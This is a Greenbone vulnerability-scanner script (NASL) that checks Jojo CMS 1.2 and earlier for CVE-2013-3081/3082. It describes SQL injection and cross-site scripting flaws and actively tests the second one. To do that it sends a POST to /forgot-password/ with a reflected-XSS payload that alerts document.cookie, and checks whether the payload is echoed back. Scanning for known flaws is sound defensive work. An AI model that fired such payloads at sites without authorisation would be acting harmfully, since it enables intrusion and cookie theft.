# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803703");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2013-3081", "CVE-2013-3082");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-05-23 15:54:25 +0530 (Thu, 23 May 2013)");
  script_name("Jojo CMS Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53418");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59933");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59934");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23153");
  script_xref(name:"URL", value:"https://xforce.iss.net/xforce/xfdb/84285");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and execute arbitrary HTML and script code in a user's browser
  session in the context of an affected website.");

  script_tag(name:"affected", value:"Jojo CMS version 1.2 and prior");

  script_tag(name:"insight", value:"Multiple flaws due to:

  - An insufficient filtration of user-supplied input passed to the
    'X-Forwarded-For' HTTP header in '/articles/test/' URI.

  - An insufficient filtration of user-supplied data passed to 'search' HTTP
    POST parameter in '/forgot-password/' URI.");

  script_tag(name:"solution", value:"Update to Jojo CMS 1.2.2 or later.");

  script_tag(name:"summary", value:"Jojo CMS is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/jojo", "/cms", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/"), port:port);

  if(rcvRes && '"Jojo CMS' >< rcvRes &&
     "http://www.jojocms.org" >< rcvRes)
  {
    postdata = "type=reset&search=%3E%3Cscript%3Ealert%28document.cookie" +
               "%29%3B%3C%2Fscript%3E&btn_reset=Send";

    req = string("POST ", dir, "/forgot-password/ HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie);</script>" >< res
       && '"Jojo CMS' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
